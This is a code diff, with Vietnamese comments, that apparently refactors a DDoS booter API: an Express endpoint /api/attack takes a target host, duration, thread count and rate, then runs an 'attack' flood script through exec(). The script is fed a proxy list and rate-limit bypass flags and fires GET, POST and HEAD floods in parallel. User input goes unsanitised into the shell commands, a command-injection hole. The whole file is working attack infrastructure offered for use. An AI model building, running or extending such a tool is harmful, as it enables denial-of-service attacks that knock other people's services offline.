@@ -10,13 +10,34 @@ const validateInput = ({ key, host, time, method, port }) => {
   return null;
 };
 
-const executeAttack = (command, res, host, port, time, modul) => {
-  exec(command, (error, stdout, stderr) => {
-    activeAttacks--; currentPID = null;
-    if (stderr) console.error(stderr);
+const executeAttack = (command) => {
+  return new Promise((resolve, reject) => {
+    exec(command, (error, stdout, stderr) => {
+      if (stderr) {
+        console.error(stderr);
+        reject(stderr);
+      } else {
+        resolve(stdout);
+      }
+    });
   });
-  currentPID = Math.floor(Math.random() * 10000) + 1;
+};
 
+const executeAllAttacks = async (methods, host, time, threads, rate, modul) => {
+  const commands = methods.map((method) => {
+    return `node --max-old-space-size=65536 attack -m ${method} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
+  });
+
+  try {
+    // Thực thi tất cả các lệnh tấn công song song
+    await Promise.all(commands.map(executeAttack));
+  } catch (error) {
+    console.error("Lỗi khi thực thi tấn công: ", error);
+    throw new Error("Lỗi khi thực thi tấn công");
+  }
+};
+
+const sendResponse = (res, host, port, time, modul, pid) => {
   let message = modul === "FULL" ? "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI" : "LỆNH TẤN CÔNG ĐÃ GỬI";
   let modulInfo = modul === "FULL" ? "GET POST HEAD" : modul;  // Hiển thị các phương thức nếu modul là FULL
 
@@ -28,11 +49,11 @@ const executeAttack = (command, res, host, port, time, modul) => {
     time, 
     modul: modulInfo,  // Thêm modul vào trong phản hồi
     method: "attack",  // Giữ nguyên method là "attack"
-    pid: currentPID 
+    pid 
   });
 };
 
-app.get("/api/attack", (req, res) => {
+app.get("/api/attack", async (req, res) => {
   const { key, host, time, method, port, modul, threads, rate } = req.query;
   if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID)
     return res.status(400).json({ status: "ERROR", message: "ĐANG CÓ CUỘC TẤN CÔNG KHÁC", statusCode: 400 });
@@ -43,16 +64,17 @@ app.get("/api/attack", (req, res) => {
 
   activeAttacks++;
 
-  // Kiểm tra modul là FULL và gửi cả 3 lệnh GET, POST, HEAD
-  if (modul === "FULL") {
-    const methods = ["GET", "POST", "HEAD"];
-    methods.forEach((method) => {
-      const command = `node --max-old-space-size=65536 attack -m ${method} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
-      executeAttack(command, res, host, port, time, modul);
-    });
-  } else {
-    const command = `node --max-old-space-size=65536 attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
-    executeAttack(command, res, host, port, time, modul);
+  try {
+    const methods = modul === "FULL" ? ["GET", "POST", "HEAD"] : [modul];
+    currentPID = Math.floor(Math.random() * 10000) + 1;
+
+    await executeAllAttacks(methods, host, time, threads, rate, modul);
+    sendResponse(res, host, port, time, modul, currentPID);
+  } catch (error) {
+    res.status(500).json({ status: "ERROR", message: "Lỗi trong quá trình tấn công", statusCode: 500 });
+  } finally {
+    activeAttacks--;
+    currentPID = null;
   }
 });
 
